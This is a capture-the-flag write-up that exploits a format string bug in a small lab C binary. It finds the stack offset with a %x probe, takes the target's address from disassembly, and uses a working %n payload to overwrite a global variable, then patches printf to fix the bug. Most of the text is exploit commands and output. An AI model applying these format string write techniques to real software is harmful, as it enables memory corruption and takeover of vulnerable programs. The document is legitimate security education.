Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

int target = 0;

int main(int argc, char *argv[])
{
	if (argc != 2)
	{
		printf("You need two arguments to run this binary, you have %d.\n", argc);
		exit(0);
	}

	printf(argv[1]);
	
	printf("Wasn't it all worth it? %x\n", target);	
	if (target == 0xe5ca3)
	{
		puts("Your celebration might have been a long way up, but here it is. Level Cleared!");
	}
}
```

So this looks similar to a lot of the previous levels. We have to change the value of the target integer to 0xe5ca3. However this challenge is different since it is the first format string level where we give input through argv[1]. This means that our input will have to be given as a function arguments instead of through a fgets() call, and the offset for our input will be much farther away. First we need to find the offset.  Since the offset is so far away, we will need to use python to create the format string which will give us the offset.

```
>>> payload = ""
>>> for i in range(1,200):
...     payload = payload + str(i) + ".%x"
... 
>>> payload = "00000" + payload
>>> payload
'000001.%x2.%x3.%x4.%x5.%x6.%x7.%x8.%x9.%x10.%x11.%x12.%x13.%x14.%x15.%x16.%x17.%x18.%x19.%x20.%x21.%x22.%x23.%x24.%x25.%x26.%x27.%x28.%x29.%x30.%x31.%x32.%x33.%x34.%x35.%x36.%x37.%x38.%x39.%x40.%x41.%x42.%x43.%x44.%x45.%x46.%x47.%x48.%x49.%x50.%x51.%x52.%x53.%x54.%x55.%x56.%x57.%x58.%x59.%x60.%x61.%x62.%x63.%x64.%x65.%x66.%x67.%x68.%x69.%x70.%x71.%x72.%x73.%x74.%x75.%x76.%x77.%x78.%x79.%x80.%x81.%x82.%x83.%x84.%x85.%x86.%x87.%x88.%x89.%x90.%x91.%x92.%x93.%x94.%x95.%x96.%x97.%x98.%x99.%x100.%x101.%x102.%x103.%x104.%x105.%x106.%x107.%x108.%x109.%x110.%x111.%x112.%x113.%x114.%x115.%x116.%x117.%x118.%x119.%x120.%x121.%x122.%x123.%x124.%x125.%x126.%x127.%x128.%x129.%x130.%x131.%x132.%x133.%x134.%x135.%x136.%x137.%x138.%x139.%x140.%x141.%x142.%x143.%x144.%x145.%x146.%x147.%x148.%x149.%x150.%x151.%x152.%x153.%x154.%x155.%x156.%x157.%x158.%x159.%x160.%x161.%x162.%x163.%x164.%x165.%x166.%x167.%x168.%x169.%x170.%x171.%x172.%x173.%x174.%x175.%x176.%x177.%x178.%x179.%x180.%x181.%x182.%x183.%x184.%x185.%x186.%x187.%x188.%x189.%x190.%x191.%x192.%x193.%x194.%x195.%x196.%x197.%x198.%x199.%x'
```

So now that we have the string, we should be able to find the offset. If you notice, there are five zeroes in the front instead of four, that is because sometimes the string isn't stored concurrently so it makes it a bit easier to find. Now to find it we are just going to grep for '30303030', which is hex for '0000'. 

```
$	./f6 000001.%x2.%x3.%x4.%x5.%x6.%x7.%x8.%x9.%x10.%x11.%x12.%x13.%x14.%x15.%x16.%x17.%x18.%x19.%x20.%x21.%x22.%x23.%x24.%x25.%x26.%x27.%x28.%x29.%x30.%x31.%x32.%x33.%x34.%x35.%x36.%x37.%x38.%x39.%x40.%x41.%x42.%x43.%x44.%x45.%x46.%x47.%x48.%x49.%x50.%x51.%x52.%x53.%x54.%x55.%x56.%x57.%x58.%x59.%x60.%x61.%x62.%x63.%x64.%x65.%x66.%x67.%x68.%x69.%x70.%x71.%x72.%x73.%x74.%x75.%x76.%x77.%x78.%x79.%x80.%x81.%x82.%x83.%x84.%x85.%x86.%x87.%x88.%x89.%x90.%x91.%x92.%x93.%x94.%x95.%x96.%x97.%x98.%x99.%x100.%x101.%x102.%x103.%x104.%x105.%x106.%x107.%x108.%x109.%x110.%x111.%x112.%x113.%x114.%x115.%x116.%x117.%x118.%x119.%x120.%x121.%x122.%x123.%x124.%x125.%x126.%x127.%x128.%x129.%x130.%x131.%x132.%x133.%x134.%x135.%x136.%x137.%x138.%x139.%x140.%x141.%x142.%x143.%x144.%x145.%x146.%x147.%x148.%x149.%x150.%x151.%x152.%x153.%x154.%x155.%x156.%x157.%x158.%x159.%x160.%x161.%x162.%x163.%x164.%x165.%x166.%x167.%x168.%x169.%x170.%x171.%x172.%x173.%x174.%x175.%x176.%x177.%x178.%x179.%x180.%x181.%x182.%x183.%x184.%x185.%x186.%x187.%x188.%x189.%x190.%x191.%x192.%x193.%x194.%x195.%x196.%x197.%x198.%x199.%x | grep 30303030
```

and the output for that...

```
000001.ffffcca42.ffffccb03.80485214.f7faf3dc5.ffffcc106.07.f7e156378.f7faf0009.f7faf00010.011.f7e1563712.213.ffffcca414.ffffccb015.016.017.018.f7faf00019.f7ffdc0420.f7ffd00021.022.f7faf00023.f7faf00024.025.b8e060126.36bdc81127.028.029.030.231.804837032.033.f7fedf1034.f7fe878035.f7ffd00036.237.804837038.039.804839140.804846b41.242.ffffcca443.804850044.804856045.f7fe878046.ffffcc9c47.f7ffd91848.249.ffffce7750.ffffce7c51.052.ffffd2c053.ffffd2cb54.ffffd2dd55.ffffd2f356.ffffd32b57.ffffd36458.ffffd37459.ffffd38860.ffffd39961.ffffd3bc62.ffffd3ce63.ffffd41264.ffffd42965.ffffd45666.ffffd47a67.ffffd48c68.ffffda1469.ffffda2770.ffffda6171.ffffda9572.ffffdabe73.ffffdaf174.ffffdb3575.ffffdbd276.ffffdbe977.ffffdbfb78.ffffdc1c79.ffffdc3180.ffffdc5081.ffffdc6282.ffffdc7683.ffffdc8984.ffffdc9a85.ffffdca986.ffffdcdf87.ffffdcf188.ffffdd0e89.ffffdd2090.ffffdd3a91.ffffdd5992.ffffdd7193.ffffdd8094.ffffdd8895.ffffdd9796.ffffddc397.ffffddd598.ffffddf599.ffffde10100.ffffde25101.ffffde37102.ffffde9d103.ffffded9104.ffffdef9105.ffffdf08106.ffffdf2a107.ffffdf49108.ffffdf54109.ffffdf6e110.ffffdf81111.ffffdfa3112.ffffdfcd113.ffffdfd4114.0115.20116.f7fd8be0117.21118.f7fd8000119.10120.bfebfbff121.6122.1000123.11124.64125.3126.8048034127.4128.20129.5130.9131.7132.f7fd9000133.8134.0135.9136.8048370137.b138.3e8139.c140.3e8141.d142.3e8143.e144.3e8145.17146.0147.19148.ffffce5b149.1f150.ffffdff3151.f152.ffffce6b153.0154.0155.0156.0157.0158.8d000000159.135f752c160.b7ff7a0b161.af5f9750162.69092a8d163.363836164.0165.2e000000166.36662f167.30303030168.252e3130169.252e3278170.252e3378171.252e3478172.252e3578173.252e3678174.252e3778175.252e3878176.252e3978177.2e303178178.31317825179.3178252e180.78252e32181.252e3331182.2e343178183.35317825184.3178252e185.78252e36186.252e3731187.2e383178188.39317825189.3278252e190.78252e30191.252e3132192.2e323278193.33327825194.3278252e195.78252e34196.252e3532197.2e363278198.37327825199.3278252eWasn't it all worth it? 0
```

Now grep highlighted the string '30303030' (even though it isn't highlighted here) and we can see that the offset is at 168. Let's test that.

```
$	./f6 `python -c 'print "0000.%168$x"'` 
0000.36662fWasn't it all worth it? 0
$	./f6 `python -c 'print "0000.%169$x"'` 
0000.30303030Wasn't it all worth it? 0
```

So you can see, the offset slightly changed because the length of the string we gave it changed. Now that we know the offset, let's find the address of the target variable by looking at the assembly code. We know that it is used in the second if then statement, so it should be used in the second cmp instruction.

```
   0x080484c6 <+91>:	add    esp,0x10
   0x080484c9 <+94>:	mov    eax,ds:0x804a028
   0x080484ce <+99>:	cmp    eax,0xe5ca3
   0x080484d3 <+104>:	jne    0x80484e5 <main+122>
```

Looking at there, we can see that the address of the target integer is 0x804a028. So now that we have the address and the offset, let's try writing to it.

```
$	./f6 `python -c 'print "\x28\xa0\x04\x08" + ".%169$x"'` 
(�.804a028Wasn't it all worth it? 0
$	./f6 `python -c 'print "\x28\xa0\x04\x08" + ".%169$n"'` 
(�.Wasn't it all worth it? 5
```

So we were able to write to the target int. Now we just need to write 0xe5ca3 - 5 = 941214 bytes to it to set it equal to the correct value (the reason it is 5 is because 4 byted from the address, and one from the "."). This may mess up the offset because of the additional 8 characters.

Input:
```
$	./f6 `python -c 'print "\x28\xa0\x04\x08" + ".%941215x%169$x"'`
```

Output:
```
          ffffd0d435313231Wasn't it all worth it? 0
```

We can see in hex "1215". Judging from where that is in our string, our address is probably two DWORDS behind 169.

Input:
```
$	./f6 `python -c 'print "\x28\xa0\x04\x08" + ".%941215x%167$x"'`
```

Output:
```
          ffffd0d4804a028Wasn't it all worth it? 0
```

As you can see there, we have the target address 804a028 so we have the correct offset and string length. Let's write to it.

Input:
```
$	./f6 `python -c 'print "\x28\xa0\x04\x08" + ".%941215x%167$n"'`
```

Output:
```
          ffffd0d4Wasn't it all worth it? e5ca4
```

So we wrote one too many bytes. Let's try writing one less byte.

Input:
```
$	./f6 `python -c 'print "\x28\xa0\x04\x08" + ".%941214x%167$n"'`
```

Output:
```
         ffffd0d4Wasn't it all worth it? e5ca3
Your celebration might have been a long way up, but here it is. Level Cleared!
```

And just like that, we pwned the binary! Now to patch it.

```
#include <stdio.h>
#include <stdlib.h>

int target = 0;

int main(int argc, char *argv[])
{
	if (argc != 2)
	{
		printf("You need two arguments to run this binary, you have %d.\n", argc);
		exit(0);
	}

	printf("%s\n", argv[1]);
	
	printf("Wasn't it all worth it? %x\n", target);	
	if (target == 0xe5ca3)
	{
		puts("Your celebration might have been a long way up, but here it is. Level Cleared!");
	}
}
```

As you can see, we formatted the printf function to print argv[1] as a string. Let's see if that fixes the issue.

```
$	./f6_secure %x.%x.%x.%x.%x
%x.%x.%x.%x.%x
Wasn't it all worth it? 0
```

Just like that, we patched the binary! 